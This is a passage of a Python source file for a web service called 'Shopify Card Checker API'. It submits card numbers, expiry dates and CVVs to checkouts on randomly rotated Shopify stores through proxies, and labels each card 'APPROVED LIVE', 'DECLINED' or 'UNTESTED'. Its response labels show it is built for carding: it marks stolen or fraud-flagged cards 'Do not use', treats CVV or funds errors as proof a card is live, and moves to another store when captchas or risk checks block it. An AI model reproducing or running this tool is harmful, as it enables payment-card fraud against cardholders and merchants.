        '3ds_pending': 'Bank requires 3DS challenge. Card live. Verify order manually.',
        'authentication_required': 'Bank requires 3DS challenge. Card live. Verify order manually.',
    }
    for k, reason in APPROVED_CODES.items():
        if k in tl:
            return running_total, f"APPROVED LIVE - {reason}", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc']):
        return running_total, "APPROVED LIVE - Bank confirmed card is live. CVV entered was wrong.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
        return running_total, "APPROVED LIVE - Bank confirmed card is live. Address mismatch.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}
    if any(k in tl for k in ['insuff', 'funds']):
        return running_total, "APPROVED LIVE - Bank confirmed card is live. Balance too low for this amount.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}

    # RULE 4: DECLINED codes — the ONLY codes that produce DECLINED
    DECLINED_HARD = {
        'stolen_card': 'Bank says card is reported stolen. Do not use.',
        'lost_card': 'Bank says card is reported lost. Do not use.',
        'expired_card': 'Card expiry is in the past. Card dead.',
        'card_expired': 'Card expiry is in the past. Card dead.',
        'invalid_account': 'Bank says account does not exist or is closed. Card dead.',
        'pickup_card': 'Bank wants card retained. Do not use.',
        'fraudulent': 'Bank flagged card for fraud. Do not use.',
        'fraud_suspected': 'Bank flagged card for fraud. Do not use.',
        'security_violation': 'Security violation. Card may be compromised.',
        'card_not_supported': 'Brand not accepted by store.',
    }
    DECLINED_SOFT = {
        'do_not_honor': 'Bank refused the transaction.',
        'card_declined': 'Generic decline. Bank refused.',
        'generic_decline': 'Generic decline. Bank refused.',
        'velocity_limit': 'Too many recent attempts.',
        'card_velocity_exceeded': 'Too many recent attempts.',
        'exceeds_limit': 'Over per-transaction limit.',
        'withdrawal_count_limit_exceeded': 'Too many recent attempts.',
        'restricted_card': 'Merchant category restricted.',
        'not_permitted': 'Merchant category blocked.',
        'transaction_not_allowed': 'Merchant category blocked.',
        'approve_with_id': 'Approved but needs verification.',
        'call_issuer': 'Bank says call issuer.',
        'pin_attempts': 'Too many PIN tries.',
    }

    for k, reason in DECLINED_HARD.items():
        if k in tl:
            return running_total, f"DECLINED HARD - {reason}", gw_name, {'amount': running_total, 'verdict': 'DECLINED_HARD', 'code': code}
    for k, reason in DECLINED_SOFT.items():
        if k in tl:
            return running_total, f"DECLINED SOFT - {reason}", gw_name, {'amount': running_total, 'verdict': 'DECLINED_SOFT', 'code': code}

    # RULE 5: UNTESTED codes — bank never spoke
    UNTESTED_EXACT = {
        'generic_error': 'Gateway failed. Bank never responded. Card untested.',
        'processing_error': 'Bank processing error. Bank never responded. Card untested.',
        'try_again_later': 'Bank says try again later. Bank never responded. Card untested.',
        'system_malfunction': 'System malfunction. Bank never responded. Card untested.',
        'issuer_not_available': 'Issuer unavailable. Bank never responded. Card untested.',
        'throttled': 'Shopify throttled the request. Bank never responded. Card untested.',
        'poll_timeout': 'Receipt poll timed out. Bank never responded. Card untested.',
        'delivery_delivery_line_detail_changed': 'Shopify checkout rejected delivery data. Bank never responded.',
        'delivery_method_not_available': 'Delivery method not available. Bank never responded.',
        'delivery_destination_invalid': 'Delivery destination invalid. Bank never responded.',
        'delivery_line_not_found': 'Delivery line not found. Bank never responded.',
        'delivery_expectation_mismatch': 'Delivery expectation mismatch. Bank never responded.',
        'payments_credit_card_base_expired': 'Payment session expired before submit. Card untested.',
        'negotiation_failed': 'Checkout negotiation failed. Bank never responded.',
        'checkout_not_found': 'Checkout session not found. Bank never responded.',
        'checkout_locked': 'Checkout session locked. Bank never responded.',
        'unable_to_process': 'Unable to process. Bank never responded.',
        'waiting_pending_terms': 'Checkout waiting for terms. Bank never responded.',
        'session_init': 'Session init failed. Bank never responded.',
        'session_expired': 'Session expired. Bank never responded.',
        'cart_empty': 'Cart was empty. Bank never responded.',
        'cart_fail': 'Cart creation failed. Bank never responded.',
        'vault_fail': 'Card vault failed. Bank never responded.',
        'submit_fail': 'Submit failed. Bank never responded.',
        'token_scrape': 'Token scrape failed. Bank never responded.',
        'no_product': 'No product found on store. Bank never responded.',
        'checkout_start': 'Checkout start failed. Bank never responded.',
        'captcha_required': 'Captcha required. Bank never responded.',
        'risk_check': 'Risk check failed. Bank never responded.',
        'checkpoint_denied': 'Checkpoint denied. Bank never responded.',
    }
    for k, reason in UNTESTED_EXACT.items():
        if k in tl:
            return None, f"UNTESTED - {reason}", gw_name, {'verdict': 'UNTESTED', 'code': code}

    # UNTESTED prefixes — any code starting with these is NOT a bank code
    UNTESTED_PREFIXES = ['delivery_', 'payments_', 'negotiation_', 'checkout_', 'session_', 'cart_', 'vault_', 'token_', 'invalid_variable', 'validation_', 'artifact_', 'input_']
    for prefix in UNTESTED_PREFIXES:
        if code_lower.startswith(prefix):
            return None, f"UNTESTED - {code}: Shopify/gateway error. Bank never responded. Card untested.", gw_name, {'verdict': 'UNTESTED', 'code': code}

    # No code at all → UNTESTED
    if not code or code_lower in ('', 'unknown', 'null', 'none'):
        return None, "UNTESTED - No bank response received. Bank never spoke.", gw_name, {'verdict': 'UNTESTED'}

    # Unknown code but card reached the bank = APPROVED LIVE
    # (bank confirmed the card exists by returning a code we didn't recognize)
    return running_total, f"APPROVED LIVE - Card reached bank, code: {code}. Bank confirmed card exists.", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code}


async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
    start = time.time()
    card_short = f"{cc[:6]}xx{cc[-4:]}"

    proxy_url = None
    if proxy and proxy != "NONE" and proxy.strip():
        p = proxy.strip()
        if p.startswith("http://") or p.startswith("https://") or p.startswith("socks5://"):
            proxy_url = p
        elif ":" in p:
            parts = p.split(":")
            if len(parts) == 4:
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                proxy_url = f"http://{parts[0]}:{parts[1]}"

    requested_site = site.replace("https://", "").replace("http://", "").rstrip("/") if site else None

    if requested_site:
        sites_to_try = [requested_site]
    elif sites:
        cleaned = [s.replace("https://", "").replace("http://", "").rstrip("/") for s in sites if s]
        random.shuffle(cleaned)
        sites_to_try = cleaned[:5]
    else:
        fallback = SHOPIFY_SITES.copy()
        random.shuffle(fallback)
        sites_to_try = fallback[:5]

    async def _try_sites(site_list, use_proxy):
        for s in site_list:
            logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
            try:
                kw = {"timeout": aiohttp.ClientTimeout(total=10, connect=5, sock_connect=5, sock_read=8), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
                if use_proxy:
                    kw["proxy"] = use_proxy
                async with aiohttp.ClientSession(**kw) as session:
                    result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=12)
                    amount, response, gw_name = result[0], result[1], result[2]
                    extra = result[3] if len(result) > 3 else None
                    elapsed_now = round(time.time() - start, 2)

                    verdict = extra.get('verdict', '') if extra else ''

                    # UNTESTED = bank never saw the card → try next site
                    if verdict == 'UNTESTED' or (response and response.startswith('UNTESTED')):
                        logger.info(f"UNTESTED {s}: {response} — trying next site")
                        continue

                    # Chain failures → try next site
                    chain_failures = ["no products", "no session", "no shipping", "checkpoint", "login", "password", "throttled", "gateway error", "negotiation", "no receipt", "invalid card", "no seller", "failed to add", "failed to create", "site requires", "payment method unavailable", "processing error"]
                    if response and any(k in response.lower() for k in chain_failures):
                        logger.info(f"CHAIN FAIL {s}: {response} — trying next site")
                        continue

                    if _is_fake_gateway(gw_name):
                        continue

                    return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict}
            except asyncio.TimeoutError:
                logger.info(f"TIMEOUT {s}")
                continue
            except Exception as e:
                logger.info(f"ERROR {s}: {str(e)[:80]}")
                continue
        return None

    result = await _try_sites(sites_to_try, proxy_url)
    if result:
        return result

    if sites_to_try and not requested_site:
        fallback = SHOPIFY_SITES.copy()
        random.shuffle(fallback)
        fallback_clean = [s for s in fallback[:3] if s not in sites_to_try]
        result = await _try_sites(fallback_clean, proxy_url)
        if result:
            return result

    if proxy_url:
        logger.info(f"All sites failed with proxy, retrying WITHOUT proxy...")
        all_sites = sites_to_try + [s for s in SHOPIFY_SITES if s not in sites_to_try][:3]
        random.shuffle(all_sites)
        result = await _try_sites(all_sites[:5], None)
        if result:
            return result

    elapsed = round(time.time() - start, 2)
    return {"status": "error", "response": "All sites failed", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed}


@app.get("/")
async def root():
    return {"status": "running", "service": "Shopify Card Checker API"}

@app.get("/health")
async def health():
    return {"status": "ok"}

@app.post("/check")
async def check(req: CheckRequest):
    if len(req.yy) == 4:
        req.yy = req.yy[2:]
    req.mm = req.mm.zfill(2)
    
    check_start = time.monotonic()
    logger.info(f"[check] {req.cc} proxy={bool(req.proxy)} - start")
    
    try:
        result = await asyncio.wait_for(
            check_card(req.cc, req.mm, req.yy, req.cvv, site=req.site, sites=req.sites, proxy=req.proxy),
            timeout=35
        )
    except asyncio.TimeoutError:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (35s hard timeout)")
        return {
            "status": "error",
            "response": "UNTESTED - Hard 35s timeout. Store or proxy too slow. Bank never responded.",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
        }
    except asyncio.CancelledError:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (cancelled)")
        return {
            "status": "error",
            "response": "UNTESTED - Request cancelled. Bank never responded.",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
        }
    except Exception as e:
        elapsed = time.monotonic() - check_start
        logger.info(f"[check] {req.cc} verdict=UNTESTED elapsed={elapsed:.1f}s (error: {str(e)[:80]})")
        return {
            "status": "error",
            "response": f"UNTESTED - Error: {str(e)[:80]}. Bank never responded.",
            "gateway": "Shopify Payments",
            "amount": None,
            "site": req.site or None,
            "elapsed": round(elapsed, 2),
            "verdict": "UNTESTED",
        }
    
    elapsed = time.monotonic() - check_start
    logger.info(f"[check] {req.cc} verdict={result.get('verdict', '?')} elapsed={elapsed:.1f}s")
    return result

@app.get("/sites")
async def get_sites():
    return {"sites": SHOPIFY_SITES, "count": len(SHOPIFY_SITES)}


if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)